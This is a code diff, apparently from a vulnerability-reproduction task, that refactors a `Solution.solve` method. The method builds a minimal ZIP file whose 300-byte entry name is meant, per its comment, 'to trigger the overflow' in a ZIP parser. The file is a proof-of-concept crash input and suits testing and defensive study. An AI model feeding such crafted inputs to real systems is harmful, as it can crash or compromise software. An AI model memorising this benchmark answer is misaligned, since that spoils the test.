@@ -2,83 +2,90 @@ import struct
 from typing import Optional
 
 
-def _le16(x: int) -> bytes:
-    return struct.pack("<H", x & 0xFFFF)
-
-
-def _le32(x: int) -> bytes:
-    return struct.pack("<I", x & 0xFFFFFFFF)
-
-
-def _make_minimal_zip_with_long_name(name_len: int = 257) -> bytes:
-    if name_len <= 256:
-        name_len = 257
-
-    filename = (b"A" * name_len)
-
-    # Local File Header (LFH)
-    lfh = b"".join(
-        [
-            _le32(0x04034B50),  # signature
-            _le16(20),          # version needed
-            _le16(0),           # general purpose bit flag
-            _le16(0),           # compression method (store)
-            _le16(0),           # last mod file time
-            _le16(0),           # last mod file date
-            _le32(0),           # crc-32
-            _le32(0),           # compressed size
-            _le32(0),           # uncompressed size
-            _le16(len(filename)),  # file name length
-            _le16(0),           # extra field length
-            filename,           # file name
-        ]
-    )
-    file_data = b""
-
-    # Central Directory File Header (CDFH)
-    cdfh = b"".join(
-        [
-            _le32(0x02014B50),  # signature
-            _le16(20),          # version made by
-            _le16(20),          # version needed
-            _le16(0),           # general purpose bit flag
-            _le16(0),           # compression method
-            _le16(0),           # last mod time
-            _le16(0),           # last mod date
-            _le32(0),           # crc-32
-            _le32(0),           # compressed size
-            _le32(0),           # uncompressed size
-            _le16(len(filename)),  # file name length
-            _le16(0),           # extra field length
-            _le16(0),           # file comment length
-            _le16(0),           # disk number start
-            _le16(0),           # internal file attributes
-            _le32(0),           # external file attributes
-            _le32(0),           # relative offset of local header
-            filename,           # file name
-        ]
-    )
-
-    cd_offset = len(lfh) + len(file_data)
-    cd_size = len(cdfh)
-
-    # End of Central Directory Record (EOCD)
-    eocd = b"".join(
-        [
-            _le32(0x06054B50),  # signature
-            _le16(0),           # number of this disk
-            _le16(0),           # disk where central directory starts
-            _le16(1),           # number of central directory records on this disk
-            _le16(1),           # total number of central directory records
-            _le32(cd_size),     # size of central directory (bytes)
-            _le32(cd_offset),   # offset of start of central directory
-            _le16(0),           # zip file comment length
-        ]
-    )
-
-    return lfh + file_data + cdfh + eocd
-
-
 class Solution:
+    def _build_zip_with_long_name(self, name_len: int) -> bytes:
+        if name_len < 257:
+            name_len = 257
+        fname = (b"A" * name_len)
+
+        # Local file header
+        lf_sig = 0x04034B50
+        ver_needed = 20
+        gp_flag = 0
+        comp_method = 0  # stored
+        mod_time = 0
+        mod_date = 0
+        crc32 = 0
+        comp_size = 0
+        uncomp_size = 0
+        extra_len = 0
+        local_header = struct.pack(
+            "<IHHHHHIIIHH",
+            lf_sig,
+            ver_needed,
+            gp_flag,
+            comp_method,
+            mod_time,
+            mod_date,
+            crc32,
+            comp_size,
+            uncomp_size,
+            len(fname),
+            extra_len,
+        ) + fname
+
+        # Central directory header
+        cd_sig = 0x02014B50
+        ver_made_by = 20
+        file_comment_len = 0
+        disk_num_start = 0
+        int_attr = 0
+        ext_attr = 0
+        local_header_offset = 0
+        central_dir = struct.pack(
+            "<IHHHHHHIIIHHHHHII",
+            cd_sig,
+            ver_made_by,
+            ver_needed,
+            gp_flag,
+            comp_method,
+            mod_time,
+            mod_date,
+            crc32,
+            comp_size,
+            uncomp_size,
+            len(fname),
+            extra_len,
+            file_comment_len,
+            disk_num_start,
+            int_attr,
+            ext_attr,
+            local_header_offset,
+        ) + fname
+
+        # End of central directory record
+        eocd_sig = 0x06054B50
+        disk_num = 0
+        cd_start_disk = 0
+        entries_this_disk = 1
+        total_entries = 1
+        cd_size = len(central_dir)
+        cd_offset = len(local_header)
+        comment_len = 0
+        eocd = struct.pack(
+            "<IHHHHIIH",
+            eocd_sig,
+            disk_num,
+            cd_start_disk,
+            entries_this_disk,
+            total_entries,
+            cd_size,
+            cd_offset,
+            comment_len,
+        )
+
+        return local_header + central_dir + eocd
+
     def solve(self, src_path: str) -> bytes:
-        return _make_minimal_zip_with_long_name(257)
+        # Minimal valid ZIP with a filename longer than 256 bytes to trigger the overflow.
+        return self._build_zip_with_long_name(300)
